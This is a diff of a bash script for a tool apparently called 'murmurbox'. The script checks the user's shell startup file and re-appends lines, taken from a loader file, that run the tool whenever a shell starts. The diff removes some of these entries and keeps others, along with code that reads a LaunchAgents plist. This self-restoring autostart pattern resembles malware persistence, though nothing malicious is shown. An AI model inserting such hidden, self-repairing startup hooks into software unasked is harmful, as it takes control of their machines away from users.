@@ -30,11 +30,7 @@ check_shell_files()
 
 check_murmur()
 {
-
-  auto666="$(cat ~/.murmurbox/loader.bash)"
-  auto="(bash ~/.murmurbox/murmurbox.bash u &) "
-  ali666="alias murmur='$auto666 ; bash ~/.murmurbox/murmurbox.bash'"
-  ali="alias murmur='bash ~/.murmurbox/murmurbox.bash'"
+  ali="$(cat ~/.murmurbox/loader.bash)"
   agentmur="$HOME/Library/LaunchAgents/launch_agent.plist"
   agentplist="$(cat $HOME/.murmurbox/agent.plist)"
   if [ "$os" == "Linux" ]; then
@@ -51,28 +47,12 @@ check_murmur()
     fi
   fi
 
-  if ! (grep -x "$auto666" <"$shell_f" &>/dev/null) ; then
-    murlog "murmur auto666 repaired" "$log_file"
-    echo -en "\n$auto666" >>"$shell_f"
-    cha=1
-  fi
-
-  if ! (grep "$auto" <"$shell_f" &>/dev/null) ; then
-    murlog "murmur auto repaired" "$log_file"
-    echo -en "\n$auto" >>"$shell_f"
-    cha=1
-  fi
   if ! (grep "$ali" <"$shell_f" &>/dev/null) ; then
     murlog "murmur alias repaired" "$log_file"
     echo -en "\n$ali" >>"$shell_f"
     cha=1
   fi
 
-  if ! (grep -x "$ali666" <"$shell_f" &>/dev/null) ; then
-    murlog "murmur ali666 repaired" "$log_file"
-    echo -en "\n$ali666" >>"$shell_f"
-    cha=1
-  fi
 
   if ! ls "$HOME"/.murmurbox/murmurbox.bash &>/dev/null ; then
     cha=1
